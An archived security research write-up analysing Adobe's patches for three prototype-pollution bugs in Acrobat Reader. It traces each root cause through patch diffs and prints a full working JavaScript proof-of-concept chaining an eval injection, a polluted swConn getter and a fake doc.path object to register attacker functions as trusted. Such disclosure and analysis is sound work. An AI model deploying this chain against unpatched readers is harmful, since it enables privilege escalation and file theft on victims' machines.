---
type: Article
title: "Three Bugs Walk Into a PDF: Prototype Pollution, Served Cold"
description: Patch comparisons explain how inherited properties and unvalidated object types crossed privileged scripting boundaries in Acrobat Reader. The analysis clarifies a previously disclosed chain and its repairs, with elevated JavaScript and file-access demonstrations.
resource: "https://starlabs.sg/blog/2026/04-three-bugs-walk-into-a-pdf-prototype-pollution-served-cold/"
tags: [article, webseclist-reference, en-sg, star-labs, prototype-pollution, javascript, pdf, owasp-a08-2021]
generated:
  by: webseclist-refs/1
  at: "2026-09-18T11:30:59+00:00"
status: stable
stale_after: 2027-09-18
sources:
  - id: original
    resource: "https://starlabs.sg/blog/2026/04-three-bugs-walk-into-a-pdf-prototype-pollution-served-cold/"
    title: "Three Bugs Walk Into a PDF: Prototype Pollution, Served Cold"
    author: Shreyas Penkar
also_at: []
authors:
  - Shreyas Penkar
canonical_url: ""
cited_by:
  - "2026-ai.md:257"
commit: ""
content_sha256: ab57be826d3011eae8d51c5286fe89025c0f7d6f9c86bed18357e9844d0b820a
depth: full
depth_reason: default
kind: article
language: en-sg
licence: unknown
original_url: "https://starlabs.sg/blog/2026/04-three-bugs-walk-into-a-pdf-prototype-pollution-served-cold/"
published: ""
publisher: STAR Labs
publisher_english: ""
raw_sha256: ceae6909fb682dae480ddc4b7fc5a51c254faa7f03f92a1b822919f7c15ad418
retrieved_from: "https://starlabs.sg/blog/2026/04-three-bugs-walk-into-a-pdf-prototype-pollution-served-cold/"
retrieved_kind: live
retrieved_utc: "2026-09-18T11:30:59+00:00"
slug: star-labs-three-bugs-walk-pdf-prototype-pollution-served-cold
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Three Bugs Walk Into a PDF: Prototype Pollution, Served Cold

**Three Bugs Walk Into a PDF: Prototype Pollution, Served Cold** - Shreyas Penkar, STAR Labs.

- Published: date not stated
- Original: <https://starlabs.sg/blog/2026/04-three-bugs-walk-into-a-pdf-prototype-pollution-served-cold/>
- Preserved from: https://starlabs.sg/blog/2026/04-three-bugs-walk-into-a-pdf-prototype-pollution-served-cold/ (live) on 2026-09-18
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

Table of Contents

## TL;DR

In April 2026, Adobe disclosed three critical security issues ([CVE-2026-34621](https://helpx.adobe.com/security/products/acrobat/apsb26-43.html),[CVE-2026-34622,CVE-2026-34626](https://helpx.adobe.com/security/products/acrobat/apsb26-44.html)) affecting Acrobat DC, Acrobat Reader DC, and Acrobat 2024. According to Adobe’s advisories, these vulnerabilities could allow attackers to execute arbitrary code and leak user information through a malicious PDF file via a prototype pollution chain and they were reportedly exploited in the wild. The initial issue, `CVE-2026-34621`, was first identified by [EXPMON](https://justhaifei1.blogspot.com/2026/04/expmon-detected-sophisticated-zero-day-adobe-reader.html?m=1).

While several reports have already covered the threat intelligence and malware-analysis aspects of the ITW samples, we were more interested in the underlying vulnerabilities themselves and how Adobe patched them.

To that end, we reverse-engineered the fixes across two product versions and analyzed the malware sample for validation and additional context. This allowed us to identify the root cause of the issues, understand the patch behavior, and develop a trigger PoC. This post documents our process of reproducing and analyzing the bugs to better understand how they were exploited in the wild and what primitives they enabled.

## Introduction

|   |   |   |
|  CVE |  CVE-2026-34621 |   |
|  Impact |  High |   |
|  Affected Products |  Windows/MacOS Systems having Adobe Reader 26.001.21367 and earlier |   |
|  Bug IDs |  APSB26-43 |   |
|  Patch |  [https://helpx.adobe.com/security/products/acrobat/apsb26-43.html](https://helpx.adobe.com/security/products/acrobat/apsb26-43.html) |   |

|   |   |   |
|  CVE |  CVE-2026-34622, CVE-2026-34626 |   |
|  Impact |  High |   |
|  Affected Products |  Windows/MacOS Systems having Adobe Reader 26.001.21411 and earlier |   |
|  Bug IDs |  APSB26-44 |   |
|  Patch |  [https://helpx.adobe.com/security/products/acrobat/apsb26-44.html](https://helpx.adobe.com/security/products/acrobat/apsb26-44.html) |   |

We first encountered these three issues in Adobe’s April 2026 [Emergency](https://helpx.adobe.com/security/products/acrobat/apsb26-43.html) [Updates](https://helpx.adobe.com/security/products/acrobat/apsb26-44.html) for Acrobat Reader, where they were described as “Improperly Controlled Modification of Object Prototype Attributes” or prototype pollution bugs. Adobe initially marked `CVE-2026-34621` as being exploited in the wild on 12th April, but subsequent [public reports](https://x.com/greenapple_w/status/2044136479283392862) suggested that the fix may have been incomplete. Two days later, Adobe released another update that addressed two additional issues, `CVE-2026-34626` and `CVE-2026-34622`.

That made the situation even more interesting. To understand what was actually going on, we decided to reverse-engineer the fixes across the two versions, trace the root cause of each CVE, and then develop a trigger PoC to validate our findings.

## How Adobe’s Fixes Gave It Away

We analyzed patch differences between consecutive Adobe Reader releases to identify affected code paths and understand the underlying causes of each vulnerability. The comparison included:

- `Adobe Reader 26.001.21367` → `26.001.21411` for `CVE-2026-34621`
- `Adobe Reader 26.001.21411` → `26.001.21431` for `CVE-2026-34626` and `CVE-2026-34622`

This process made it possible to pinpoint the exact changes introduced in each patch and relate them directly to the vulnerabilities they address.

For `CVE-2026-34621`, the fix is a single-line change, as illustrated in the patch diff:

![Patch 1](https://starlabs.sg/blog/2026/images/Three-Bugs-Walk-Into-a-PDF-001.png) **Figure 1: Patch One**

![Patch 2](https://starlabs.sg/blog/2026/images/Three-Bugs-Walk-Into-a-PDF-002.png) **Figure 2: Patch Two**

This patch changes `swConn` from a property-resolved name into a true local variable. Now, `swConn` is allocated as a local binding in the current function so reads of `swConn` no longer consult the global object or inherited prototypes. After analysing the code further we found that the root cause for this issue is an unsafe use of an unqualified non-local `swConn` identifier inside a privileged collaboration login workflow, specifically in the `SilentDocCenterLogin` function *[1]*. In the vulnerable code, `swConn` is assigned without a local declaration:

```js
function SilentDocCenterLogin (data, connectParams)
var isFirstLaunch = false;
	app.beginPriv()
	isFirstLaunch = Collab.isFirstLaunch(data.WT);
	app.endPriv();
	app.beginPriv();
	data.user = Collab.getUserIDFromStore();
	app.endPriv();
if(isFirstLaunch)
		data.isFirstLaunch = true;
return false;
if(data.reviewType == "SharedReview" || data.reviewType == "FormDistribution")
        var addStringToPayloadParams = {};
	    addStringToPayloadParams.name = "Authentication_Successful";
try
	    app.beginPriv();
	    swConn = Collab.swConnect(connectParams/*{bShowProgressMonitor: bShowProgressMonitor}*/); // [1]
	    app.endPriv();
        ...
        ...

```

In Acrobat’s JavaScript environment, that means `swConn` earlier was not a lexical local variable. Instead, it was resolved through the global object/property lookup path. This is exactly the kind of situation where prototype pollution becomes dangerous. If an attacker can influence how `swConn` resolves, the collaboration code may read or write an attacker controlled object rather than a real internal connection object.

So if `Object.prototype.swConn` is polluted, the trusted collaboration code then later used `swConn`, it interacted with an attacker-supplied fake object. This fake object then could redirect execution into a `SOAP.stringFromStream` (fake stream path) and ultimately cause `app.trustedFunction(functionRef)` to be invoked on attacker-selected functions, which can lead to privilege escalation within Adobe Reader. That’s a powerful primitive in itself. Let’s check out the other 2 issues.

Amongst the few changes we saw in this new diff, 2 of them stood out as security fixes. This is the first fix -

![Patch 3](https://starlabs.sg/blog/2026/images/Three-Bugs-Walk-Into-a-PDF-003.png) **Figure 3: Patch Three**

This patch in the `ANFancyAlertImpl` function changes the handler construction model from `data -> source code -> eval -> function` to `data -> closure parameter -> function`. Now `bid` is carried only as a runtime value captured by a closure so a malicious `bid` can only be a string value passed to `dialog.end(id)`. `ANFancyAlertImpl` basically iterates over the keys of the `buttons` object and used each key to build a handler string, then passes that string to `eval`. The vulnerable code looked like:

```js
...
...
for(var i in buttons)
    var bc = buttons[i];
    var bid = "btn" + i;
    ba[ba.length] = {
        type: "button",
        item_id: bid,
        name: bc,
        alignment: "align_right"
    };
    // throw a handler for the button in
    desc[bid] = eval("(function(dialog) { dialog.end('" + bid + "'); })"); // [2]
    ...
    ...

```

Here, the function could potentially enumerate attacker controlled object keys, derive `bid = "btn" + i`, splice `bid` directly into JavaScript source text, and `eval` the resulting handler *[2]*. This could lead to attacker javascript code execution from attacker controlled dialog button identifiers. A useful primitive for bootstrapping. The fix seems to remove the interpreter boundary entirely rather than trying to escape strings more carefully thus closing this bootstrap gadget.

Let’s look at the other security patch -

![Patch 4](https://starlabs.sg/blog/2026/images/Three-Bugs-Walk-Into-a-PDF-004.png) **Figure 4: Patch Four**

This fix ensures that `doc.path` is indeed a string and cannot be an object. It forces primitive-string type, copies into a local normalized value, and then use only the normalized value for later string operations. Basically, this bug seems to be an object confusion across trusted string-processing sinks. Trusted collaboration workflows accepted values such as `doc.path`, `props.originalPath`, `props.savePath`, `decodedURL`, `doc.documentFileName`, reviewer strings and a few automation workflow parameters without first proving they were primitive strings *[3]*. The vulnerable pattern in `ANShareFile` trusted function looked like this:

```js
ANShareFile = app.trustedFunction(function(props)
    var doc = props.doc;
    ...
    var data = {};
    if(doc && doc.path) // [3]
        data.docPath = doc.path;
        data.docName = data.docPath.substring(data.docPath.lastIndexOf('/') + 1, data.docPath.length); // [4]
        data.doc = doc;
        ...
        ...

```

This pattern is followed by later string operations like `.substring(...)`, `.lastIndexOf(...)`, `.match(...)` or string concatenation constructs *[4]*. This is dangerous because a non-string object can expose attacker controlled methods or accessors with those names. If privileged Acrobat code treats that object as a string and calls those methods, attacker code executes on the trusted call stack. A useful primitive indeed.

Similar fixes are made in different functions as well to patch the variants. These patches appear in these functions - `ANShareFile`, `ANStartApproval`, `ANSendForApproval`, `ANSendForReview`, `ANSendForSharedReview`, `CBSharedReviewCompleteAutomation`, `ANSendForFormDistribution` and `CBBBRInvite` to mitigate this vulnerability.

Based on Adobe’s advisory, `CVE-2026-34622` and `CVE-2026-34626` are classified as prototype pollution bugs. Our patch-diff analysis identified two code locations where the developers explicitly marked the changes as security fixes, but it remains unclear whether these patches correspond exactly to the listed CVEs. They may represent the same vulnerabilities, or related variants of them.

Now, that we have a clear idea of the issues and the primitives they yield, let’s try writing a trigger PoC for it.

## Three Polluted Primitives, One Pure Chain

It appears that these three issues are combined to form a stronger exploitation primitive. To validate this hypothesis, we also reverse engineered the ITW malware sample to extract the portion where these vulnerabilities were exercised. In the sections that follow, we walk through the underlying primitives and progressively build up the exploit chain.

Our PoC first needs code execution in the normal Reader scripting context. The `ANFancyAlertImpl` bug provides this primitive. In the vulnerable code, as we saw, `ANFancyAlertImpl` built dialog button handlers by concatenating strings and passing the result to `eval`. We can control the behavior of the button key in the `buttons` object:

```js
buttons = {
    "a(a(a'); }); global.A(); throw Error('oops'); //": 0
};

```

This malicious key breaks out of the expected string context and injects `global.A()`. So we can call `ANFancyAlertImpl` in the following way:

```js
ANFancyAlertImpl('', [], 0, buttons, 0, 0, 0, 0, 0);

```

This way, we can craft a malicious key can break out of the expected string literal and inject arbitrary JavaScript (in this case: `global.A()`). It executes attacker controlled bootstrap JS which can set up the later prototype pollution logic. Moving on, as we saw, `CVE-2026-34621` provides the privilege-escalation primitive by abusing `swConn` resolution and `SilentDocCenterLogin` to register attacker controlled functions as trusted functions. The PoC would first create a fake `stream`:

```js
stream = {
    'read': app.trustedFunction.bind(app, functionRef)
};

```

We then shape a fake `swConn` object that exposed `getFullName`. After this we poison `Object.prototype.swConn`:

```js
ob = {
    'getFullName': SOAP.stringFromStream.bind(SOAP, stream)
};

Object.prototype.__defineGetter__('swConn', () => { return ob; });

```

This is done because the code expects `swConn` to be an internal connection object. Instead, we make any lookup of `swConn` resolve to the fake object `ob`. So when the exploit later steers Acrobat into `SilentDocCenterLogin(...)`, Acrobat reaches code that uses `swConn` and ultimately calls through the fake `getFullName` stream path. The stream’s `read` callback is:

```js
app.trustedFunction.bind(app, functionRef)

```

which means that the victim function reference, such as `global.url` or any other defined functions, gets registered by Acrobat as a trusted function. So when privileged collaboration code thought it was doing `data.swConn.getFullName()` it was actually walking through attacker controlled objects that ended in registration of attacker-supplied `functionRef` as a trusted function. This is the core escalation step.

To glue these 2 primitives together, we still need a suitable internal call path that consumes the polluted properties. The third primitive we saw earlier provides the trusted workflow sink by allowing non-string `doc.path` behavior inside `ANShareFile`. Since the collaboration code path around `ANShareFile` assumed `doc.path` was a primitive string and used string methods like `lastIndexOf` and `substring`, the PoC breaks that assumption by installing a getter for `path`:

```js
this.__defineGetter__('path', () => { return fakeobj; });

// ANShareFile internally accesses .swConn and .path on objects
// Due to prototype pollution, it gets our poisoned values
// This leads to SilentDocCenterLogin being called with attacker data
// which grants trustedFunction-level privileges to functionRef
ANShareFile({ 'doc': eval('this') });

```

where `fakeobj` is:

```js
data = { 'WT': '' };
this.dirty = false;

fakeobj = {
    'lastIndexOf': SilentDocCenterLogin.bind(app, data, {}),
    'substring': () => { throw Error(''); }
};

```

So when `ANShareFile` later processes `doc.path` as if it were a string, we can actually control the behavior behind that string like object. Essentially, this primitive acts like the bridge between the initial JS execution and the later privilege-escalation logic since we required an attacker controlled behavior on a trusted collaboration call path. By chaining these 3 primitives it is possible for us to define our own javascript functions, register them as trusted functions via privilege escalation within Adobe and execute them. This is a very powerful primitive which can be used for arbitrary file system read or even arbitrary code execution.

This is the final PoC we came up with -

```javascript
global.url = function(cmd) {
    var ret = undefined;
    app.beginPriv();
    app.launchURL("https://starlabs.sg/");
    app.endPriv();
    return ret;
}

global.A = () => {
    // Define the exploit function as global.B
    // B() is a reusable privilege elevation function which is called once per function
    // to register that function as a trustedFunction via the pollution chain
    global.B = function(functionRef) {
        try {
            // Create a fake stream object
            // functionRef (e.g., global.get) is bound as the 'read' callback
            // When stream.read() is called, it calls app.trustedFunction(functionRef)
            // which registers functionRef as a trusted function
            stream = {
                'read': app.trustedFunction.bind(app, functionRef)
            };

            // Create a fake doc-like object
            ob = {
                'getFullName': SOAP.stringFromStream.bind(SOAP, stream)
            };

            // Poison Object.prototype with a getter for "swConn"
            // After this, any object's .swConn property returns our fake 'ob'
            // 'swConn' is an internal Adobe property used by ANShareFile
            // for sharing connection state
            Object.prototype.__defineGetter__('swConn', () => { return ob; });

            // Set up data for SilentDocCenterLogin abuse
            data = { 'WT': '' };
            this.dirty = false;

            // Create fake path object that triggers SilentDocCenterLogin
            fakeobj = {
                'lastIndexOf': SilentDocCenterLogin.bind(app, data, {}),
                'substring': () => { throw Error(''); }
            };

            // Poison 'this' object's path getter
            this.__defineGetter__('path', () => { return fakeobj; });

            // ANShareFile internally accesses .swConn and .path on objects
            // Due to prototype pollution, it gets our poisoned values
            // This leads to SilentDocCenterLogin being called with attacker data
            // which grants trustedFunction-level privileges to functionRef
            ANShareFile({ 'doc': eval('this') });

        } catch (e) {
        }
    };
};

// The button key contains injected JavaScript that breaks out of
// ANFancyAlertImpl's internal string processing:
buttons = {
    "a(a(a'); }); global.A(); throw Error('oops'); //": 0
};

// ANFancyAlertImpl processes button labels as JavaScript internally.
// The crafted key escapes the string context, closes the function,
// calls global.A() to set up the prototype pollution,
// then throws to abort normal processing.
try {
    ANFancyAlertImpl('', [], 0, buttons, 0, 0, 0, 0, 0);
} catch (e) {
    // Expected - the injected code throws Error('oops')
}

// Clean up the prototype pollution from the trigger
delete Object.prototype.swConn;

// Each call re-pollutes Object.prototype.swConn, feeds the function through
// the ANShareFile->SilentDocCenterLogin chain, and registers it as trusted
//
global.B(global.url);                    // global.url() now has trustedFunction access

// This user defined function will now run with elevated context
global.url();

```

As discussed, this PoC demonstrates prototype pollution and privilege escalation in Adobe Reader by combining all three primitives into a stronger chain. In this setup, attacker controlled functions can be registered as trusted functions (here, `global.url`) enabling arbitrary JavaScript execution on the system. Combined with attacker-supplied functions, this can lead to arbitrary file-system reads and further JavaScript execution. To demonstrate this, we modified the PoC to read `ntdll.dll` and `bootsvc.dll` and extract the current system’s `ProdVersion` and `OSVersion` and display it as an alert popup along with launching a web URL (all three are privileged operations in Adobe JS Engine), thereby showcasing arbitrary JavaScript execution in an elevated context with arbitrary file-read capability.

Tested On: `Adobe Reader 26.001.21367` on `Windows 10`.

## Conclusion

In conclusion, `CVE-2026-34621`, and the other 2 primitives together form a prototype-pollution chain in Adobe Reader that was actively exploited in the wild. By reverse-engineering Adobe’s patches across 2 versions, we were able to trace the root cause of each issue, understand how the fixes evolved, and confirm that the bugs could be chained into a stronger primitive. Taken together, these flaws allow attacker controlled JavaScript to cross trust boundaries, register attacker-defined functions as trusted, and reach elevated JavaScript execution with sensitive file-read capability. The PoC shows how that chain can be turned into practical exploitation, closely matching the behavior seen in the ITW sample.

We also closely followed Adobe’s patch cycle and noted that the company appeared to be aware of all three issues involved in the ITW exploit chain. Because this was an emergency release, Adobe likely prioritized the `swConn` bug (`CVE-2026-34621`), which enabled privilege escalation and allowed them to break the exploit chain quickly. That patch seems to have been straightforward, making it a sensible candidate for immediate remediation. By contrast, the `doc.path` issue had multiple possible variants, so it was prudent to spend more time validating and fixing it thoroughly. The status of the `ANFancyAlertImpl` bug is less clear, it is uncertain whether the fix was simply deferred or initially overlooked, but Adobe ultimately addressed it as well.

## References:

- [https://helpx.adobe.com/security/products/acrobat/apsb26-43.html](https://helpx.adobe.com/security/products/acrobat/apsb26-43.html)
- [https://helpx.adobe.com/security/products/acrobat/apsb26-44.html](https://helpx.adobe.com/security/products/acrobat/apsb26-44.html)
- [https://pub.expmon.com/analysis/328131/](https://pub.expmon.com/analysis/328131/)
- [https://justhaifei1.blogspot.com/2026/04/expmon-detected-sophisticated-zero-day-adobe-reader.html?m=1](https://justhaifei1.blogspot.com/2026/04/expmon-detected-sophisticated-zero-day-adobe-reader.html?m=1)
- [https://www.virustotal.com/gui/file/65dca34b04416f9a113f09718cbe51e11fd58e7287b7863e37f393ed4d25dde7/behavior](https://www.virustotal.com/gui/file/65dca34b04416f9a113f09718cbe51e11fd58e7287b7863e37f393ed4d25dde7/behavior)
- [https://www.threatlocker.com/blog/adobe-acrobat-reader-cve-2026-34621-active-exploitation-via-prototype-pollution](https://www.threatlocker.com/blog/adobe-acrobat-reader-cve-2026-34621-active-exploitation-via-prototype-pollution)
- [https://www.penligent.ai/hackinglabs/he/cve-2026-34621-inside-adobe-readers-prototype-pollution-zero-day/](https://www.penligent.ai/hackinglabs/he/cve-2026-34621-inside-adobe-readers-prototype-pollution-zero-day/)
- [https://gist.github.com/N3mes1s/9e55e8d781235ee256d5b3f6720222dd](https://gist.github.com/N3mes1s/9e55e8d781235ee256d5b3f6720222dd)
- [https://gist.github.com/joe-desimone/296eeb76b014e1e42530654a33aa7247](https://gist.github.com/joe-desimone/296eeb76b014e1e42530654a33aa7247)
